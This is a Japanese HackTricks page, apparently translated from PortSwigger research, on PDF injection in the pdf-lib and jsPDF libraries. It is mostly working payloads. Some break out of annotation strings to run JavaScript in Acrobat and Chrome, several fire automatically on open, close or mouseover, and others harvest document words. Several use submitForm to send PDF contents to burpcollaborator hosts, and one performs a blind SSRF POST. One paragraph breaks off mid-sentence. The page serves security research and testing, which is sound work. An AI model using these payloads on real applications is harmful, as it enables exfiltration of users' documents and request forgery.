<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出**してください。

</details>


**PDFファイル内に入力が反映されている場合、JavaScriptを実行したり、PDFの内容を盗み出すためにPDFデータを注入することができます。**

以下の情報は[**https://portswigger.net/research/portable-data-exfiltration**](https://portswigger.net/research/portable-data-exfiltration)から取得されました。

## PDF-Lib

今回は、[PDFLib](https://pdf-lib.js.org)を使用していました。ライブラリを使用して注釈を作成し、注釈URIに閉じ括弧を注入できるかどうかを確認しました。そして、うまくいきました！私が使用した脆弱なコードのサンプルは次のとおりです：

`...`  \
`A: {`\
`Type: 'Action',`\
`S: 'URI',`\
``URI: PDFString.of(`injection)`),``\
`}`\
`})`\
`...`

[完全なコード：](https://github.com/PortSwigger/portable-data-exfiltration/blob/main/PDF-research-samples/pdf-lib/first-injection/test.js)

注入が成功したかどうかはどのように知りましたか？閉じ括弧を注入しない限り、PDFは正しくレンダリングされます。これにより、閉じ括弧が文字列から抜け出して無効なPDFコードを引き起こしていることが証明されました。PDFを壊すことができましたが、もちろんJavaScriptを実行できることを確認する必要がありました。レンダリングされたPDFコードを調べると、出力がFlateDecodeフィルタを使用してエンコードされていることに気付きました。ブロックを解凍するための小さなスクリプトを作成し、注釈セクションの出力は次のようになりました：`<<`\
`/Type /Annot`\
`/Subtype /Link`\
`/Rect [ 50 746.89 320 711.89 ]`\
`/Border [ 0 0 2 ]`\
`/C [ 0 0 1 ]`\
`/A <<`\
`/Type /Action`\
`/S /URI`\
`/URI (injection))`\
`>>`\
`>>`

明らかに、注入文字列は閉じ括弧でテキストの境界を閉じており、PDFが正しくレンダリングされないようになっています：

![PDFを読み込む際にエラーダイアログが表示されるスクリーンショット](https://portswigger.net/cms/images/34/f4/3ed2-article-screenshot-showing-damaged-pdf.png)

素晴らしい、PDFのレンダリングを壊すことができましたが、次はどうすればいいでしょうか？JavaScriptを呼び出す注入を考える必要があります - PDF注入のalert(1)です。

XSSベクトルがブラウザの解析に依存するように、PDF注入の脆弱性はPDFレンダラに依存する場合があります。私はまずAcrobatをターゲットにしました。Chromeではベクトルがうまく機能しないと思われたためです。2つのことに気付きました：1）追加の注釈アクションを注入できること、2）既存の閉じ括弧を修復するとPDFがレンダリングされること。いくつかの実験の結果、注入が追加の注釈アクションを注入し、JavaScriptを実行し、閉じ括弧を修復する素敵なペイロードを作成しました：`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action>>/>>(`

まず、括弧から抜け出し、新しい注釈辞書を始める前に>>を使用して辞書から抜け出します。/S/JavaScriptは注釈をJavaScriptベースにし、/JSはJavaScriptが格納される場所です。括弧の中には実際のJavaScriptがあります。括弧がバランスしている場合は、括弧をエスケープする必要はありません。最後に、注釈のタイプを追加し、辞書を終了し、閉じ括弧を修復します。これはとてもクールでした。JavaScriptを実行する注入を作成できましたが、それだけでは何の役にも立ちませんよね？JavaScriptを実行できますが、DOMにアクセスすることはできないため、クッキーを読み取ることはできません。その後、Jamesが現れて、注入からPDFの内容を盗むことを提案しました。PDFの内容を取得する方法を調べ始めました。Acrobatで、ユーザーの操作なしにフォームを送信するためにJavaScriptを使用できることを発見しました！JavaScript APIの仕様を見ると、PDFコードのすべての内容をPOSTリクエストで外部サーバーに送信するJavaScriptを追加するのはかなり簡単でした：`/blah)>>/A<</S/JavaScript/JS(app.alert(1);`\
`this.submitForm({`\
`cURL: 'https://your-id.burpcollaborator.net',cSubmitAs: 'PDF'}))`\
`/Type/Action>>/>>(`

alertは必要ありませんが、注入がJavaScriptを実行していることを証明するために追加しました。

次に、JavaScriptを使用せずにPDFの内容を盗む方法を見てみました。PDFの仕様から、SubmitFormというアクションを使用できることがわかりました。以前、Burp SuiteでスキャンチェックのためにPDFを構築したときに使用
もしJavaScriptでこれを評価すると、10進数の値256が得られます。つまり、Flagsエントリを256に設定すると、SubmitPDFフラグが有効になり、フォームを送信する際にPDFの内容が送信されます。先ほど作成したベースのインジェクションを使用して、JavaScriptの代わりにSubmitFormアクションを呼び出すように変更するだけです:`/blah)>>/A<</S/SubmitForm/Flags 256/F(`\
`https://your-id.burpcollaborator.net)`\
`/Type/Action>>/>>(`

## sPDF

次に、別のPDFライブラリである[jsPDF](https://parall.ax/products/jspdf)に対して自分の手法を適用し、脆弱性があることを発見しました。このライブラリを攻撃するのはかなり楽しかったです。なぜなら、ブラウザで実行できるAPIがあり、入力するたびにリアルタイムでPDFを生成することができるからです。PDP-Libライブラリと同様に、彼らも注釈のURL内の括弧をエスケープするのを忘れていました。ここでは、urlプロパティが脆弱でした:`doc.createAnnotation({bounds:`\
`{x:0,y:10,w:200,h:200},`\
``type:'link',url:`/input`});``\
`//vulnerable`

そのため、彼らのAPIを使用してPDFを生成し、PDFコードをurlプロパティに注入しました:

`var doc = new jsPDF();`\
`doc.text(20, 20, 'Hello world!');`\
`doc.addPage('a6','l');`\
`doc.createAnnotation({bounds:`\
`` {x:0,y:10,w:200,h:200},type:'link',url:` ``\
`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action/F 0/(`\
`` `}); ``

辞書のtypeエントリと不要なFエントリを削除してベクトルを縮小しました。既存の括弧によって閉じられるように、ぶら下がっている括弧を残しました。インジェクションのサイズを縮小することは重要です。なぜなら、インジェクション先のWebアプリケーションが制限された文字数しか許容しない場合があるからです。`/blah)>>/A<</S/JavaScript/JS(app.alert(1)`

さらに調査を進めると、複数の注釈を注入することも可能であることがわかりました。これは、単にアクションを注入するだけでなく、注釈から抜け出して独自のrect座標を定義し、ドキュメントのどのセクションをクリック可能にすることができることを意味します。このテクニックを使用すると、ドキュメント全体をクリック可能にすることができました。`/) >> >>`\
`<</Type /Annot /Subtype /Link /Rect [0.00 813.54 566.93 -298.27] /Border [0 0`\
`0] /A <</S/SubmitForm/Flags 0/F(https://your-id.burpcollaborator.net`

## インタラクションなしで注釈を実行する

これまでに示したベクトルは、注釈からのアクションをアクティブ化するためにクリックが必要です。通常、Jamesは「自動的に実行できますか？」という質問をしました。PDFの仕様を調べてみると、注釈のいくつかの興味深い機能に気付きました:

「**PV**と**PI**のエントリは、開いているページと表示されているページを区別することができます。ビューアアプリケーションでは、一度に1つのページのみが開いていると見なされますが、ページのレイアウトに応じて複数のページが表示されることがあります。」

辞書にPVエントリを追加すると、注釈はAcrobatで自動的に発火します！それだけでなく、PCエントリを使用して、PDFドキュメントが閉じられたときに自動的にペイロードを実行することもできます。攻撃者は、PDFを開いたり閉じたりするときにあなたを追跡することができます。

以下は、注釈から自動的に実行する方法です:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/)``\
`>> >>`\
``<</Subtype /Screen /Rect [0 0 900 900] /AA <</PV <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Auto execute');`

PDFを閉じると、この注釈が発火します:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >>``\
``<</Subtype /Screen /Rect [0 0 900 900] /AA <</PC <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Close me');`

## Chrome

これまでAcrobatについてたくさん話しましたが、PDFium（ChromeのPDFリーダー）はどうでしょうか？Chromeは厄介です。JavaScriptのサポートがAcrobatよりも制限されているため、攻撃対象の範囲ははるかに小さくなります。最初に気付いたことは、Chromeでは注釈内でJavaScriptが実行されていないことでしたので、私の概念実証はうまくいきませんでした。Chromeでベクトルを動作させるためには、少なくとも注釈内でJavaScriptを実行する必要があります。しかし、まずは注釈内のURLを上書きしてみることにしました。これは非常に簡単でした。以前に考案したベースのインジェクションを使用して、既存のURLを上書きするURIエントリを持つ別のアクションを単純に注入することができました:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/blah)>>/A<</S/URI/URI(https://portswigger.net)``\
``/Type/Action>>/F 0>>(`});``\
`doc.text(20, 20, 'Test text');`

これにより、クリックするとportswigger.netに移動します。次に、さまざまなインジェクションを試してJavaScriptを呼び出そうとしましたが、これは毎回失敗しました。それは不可能だと思いました。一歩引いて、インジェクションなしでChromeでクリックからJavaScriptを呼び出すための完全なPDFを手動で構築してみることにしました。AcroFormボタンを使用すると、ChromeではJavaScriptの実行が許可されますが、問題はPDFの一部への参照が必要であることでした。JSPDFからJavaScriptを呼び出すインジェクションを作成することに成功しました:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.825 0.8275 0.8275]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Subtype/Widget/AP<</N <</Type/XObject/BBox[ 0 0 72 21.6]/Subtype/Form>>>>/Parent <</Kids[ 3 0 R]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(app.alert(1))/Type/Action/F 4/DA(blah`});``\
`doc.text(20, 20, 'Click me test');`
上記のベクトルでは、PDFの構造に関する知識が必要です。\[ 3 0 R]は特定のPDFオブジェクトを指し、ブラインドPDFインジェクション攻撃を行う場合、その構造を知ることはできません。それでも、次のステージではフォームの送信を試みます。これにはsubmitForm関数を使用できます。また、注釈にはクリックが必要なため、Chromeはそれを許可します:`/) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.0 813.54 566.93 -298.27]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Subtype/Widget/AP<</N <</Type/XObject/BBox[ 0 0 72 21.6]/Subtype/Form>>>>/Parent <</Kids[ 3 0 R]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(app.alert(1);this.submitForm('https://your-id.burpcollaborator.net'))/Type/Action/F 4/DA(blah`

これは機能しますが、乱雑でPDFの構造に関する知識が必要です。これを大幅に削減し、PDFの構造への依存をなくすことができます:`#) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0 0 889 792]/CA(Submit)>>/Rect [ 0 0 889 792]/Subtype/Widget/AP<</N <</Type/XObject/Subtype/Form>>>>/Parent <</Kids[ ]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(`\
`app.alert(1)`\
`)/Type/Action/F 4/DA(blah`\
``

まだ削除できるコードがあります:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)>>>><</Type/Annot/Rect[ 0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(A)>>/A<</S/JavaScript/JS(app.alert(1))/(`});``\
`doc.text(20, 20, 'Test text');`\
``

上記のコードは注釈から抜け出し、新しい注釈を作成し、ページ全体をクリック可能にします。JavaScriptを実行するためには、ボタンを注入し、"T"エントリを使用して任意のテキストを与える必要があります。そして、辞書内のJSエントリを使用してJavaScriptコードを注入できます。ChromeでJavaScriptを実行することは素晴らしいことです。この研究を始めたときには可能だとは思いませんでした。

次に、submitForm関数を調査してPDFの内容を盗む方法を見てみました。この関数を呼び出すことができ、上記の例のように外部サーバーに接触することがわかっていますが、完全なAcrobat仕様をサポートしているのでしょうか？[PDFiumのソースコード](https://github.com/PDFium/PDFium/blob/master/fpdfsdk/src/javascript/Document.cpp#L818)を調べましたが、この関数はSubmitAsPDFをサポートしていません :( FDFはサポートしていることがわかりますが、残念ながらこれはPDFの内容を送信しません。他の方法を探しましたが、利用可能なオブジェクトがわかりませんでした。Acrobatと同じアプローチを取り、興味深いオブジェクトを見つけるためにファズ/列挙ツールを作成しました。Chromeから情報を取得するのはAcrobatよりも難しかったです。alert関数を使用して出力する前に、情報をチャンクごとに収集する必要がありました。これは、alert関数が送信された文字列を切り捨てるためです。...`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)>> <</Type/Annot/Rect[0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(a)>>/A<</S/JavaScript/JS(``\
`(function(){`\
`var obj = this,`\
`data = '',`\
`chunks = [],`\
`counter = 0,`\
`added = false, i, props = [];`\
`for(i in obj) {`\
`props.push(i);`\
`}`\
`...`

[完全なコード](https://github.com/PortSwigger/portable-data-exfiltration/blob/main/PDF-research-samples/jsPDF/chrome/enumerator/test.js)

列挙ツールの出力を検査し、PDFから情報を取得するためにさまざまな関数を呼び出してみました。最終的に、PDFドキュメントから単語を抽出できる非常に興味深い関数であるgetPageNthWordを見つけました。これにより、コンテンツを盗むことができます。この関数には、最初の単語が抽出されないという微妙なバグがありますが、ほとんどの場合、ほとんどの単語を抽出できます:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)>> <</Type/Annot/Rect[0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(a)>>/A<</S/JavaScript/JS(``\
`words = [];`\
`for(page=0;page<this.numPages;page++) {`\
`for(wordPos=0;wordPos<this.getPageNumWords(page);wordPos++) {`\
`word = this.getPageNthWord(page, wordPos, true);`\
`words.push(word);`\
`}`\
`}`\
`app.alert(words);`\
`` `}); ``\
`doc.text(20, 20, 'Click me test');`\
`doc.text(20, 40, 'Abc Def');`\
`doc.text(20, 60, 'Some word');`\
``

これで、Chrome上でPDFの内容を盗むことができるので、submitFormベクトルと組み合わせるとデータを外部サーバーに送信できます。唯一の欠点は、クリックが必要であることです。Chrome上でクリックなしでJavaScriptを実行できるかどうか疑問に思いました。再びPDFの仕様を調べると、注釈辞書には「E」という別のエントリがあり、マウスが注釈領域に入ると注釈が実行されるということがわかりました。つまり、マウスオーバーイベントです。残念ながら、これはフォームの送信を有効にするためのユーザーの対話とはみなされません。したがって、JavaScriptを実行できますが、データに何もできません。データをこのイベントで送信できるようにChromeを設定できる場合は、教えてください。興味深いです。とにかく、マウスオーバーアクションをトリガーするコードは次のとおりです:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >>``\
``<</Type /Annot /Subtype /Widget /Parent<</FT/Btn/T(a)>> /Rect [0 0 900 900] /AA <</E <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Test');`\
``
## PDFium/AcrobatにおけるSSRF

PDFium/Acrobatを使用してPOSTリクエストを送信し、SSRF攻撃を実行することが可能です。これは[ブラインドSSRF](https://portswigger.net/web-security/ssrf/blind)となります。POSTリクエストを行うことはできますが、レスポンスを読むことはできません。POSTリクエストを構築するために、以前に示したように/parentディクショナリキーを使用してフォーム要素を注釈に割り当て、JavaScriptの実行を可能にします。ただし、以前に行ったようにボタンを使用するのではなく、テキストフィールド(/Tx)にパラメータ名(/T)とパラメータ値(/V)のディクショナリキーを割り当てることができます。使用するパラメータ名をsubmitForm関数に配列として渡す必要があることに注意してください:`#)>>>><</Type/Annot/Rect[ 0 0 900 900]/Subtype/Widget/Parent<</FT/Tx/T(foo)/V(bar)>>/A<</S/JavaScript/JS(`\
`app.alert(1);`\
`this.submitForm('https://aiws4u6uubgfdag94xvc5wbrfilc91.burpcollaborator.net', false, false, ['foo']);`\
`)/(`\
``

他の攻撃（例：[request smuggling](https://portswigger.net/web-security/request-smuggling)）を連鎖させる際に有用な、改行を含む生のテキストを送信することもできます。POSTリクエストの結果は、次のCollaboratorリクエストで確認できます：

![PDFからのBurp Collaboratorリクエストを示すスクリーンショット](https://portswigger.net/cms/images/3f/61/fd38-article-ssrf-screenshot.png)

最後に、ChromeとAcrobatのハイブリッドPDFインジェクションで終わりたいと思います。最初の部分では、既存の注釈にJavaScriptを注入してAcrobat上でJavaScriptを実行します。2番目の部分では、注釈から抜け出し、Chrome用の新しい注釈を注入し、新しいクリック可能な領域を定義します。再びAcroformのトリックを使用してボタンを注入し、JavaScriptを実行します：`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)/S/JavaScript/JS(app.alert(1))/Type/Action>> >> <</Type/Annot/Rect[0 0 900 700]/Subtype/Widget/Parent<</FT/Btn/T(a)>>/A<</S/JavaScript/JS(app.alert(1)`});``\
`doc.text(20, 20, 'Click me Acrobat');`\
`doc.text(20, 60, 'Click me Chrome');`


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか？または、HackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしてください。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>
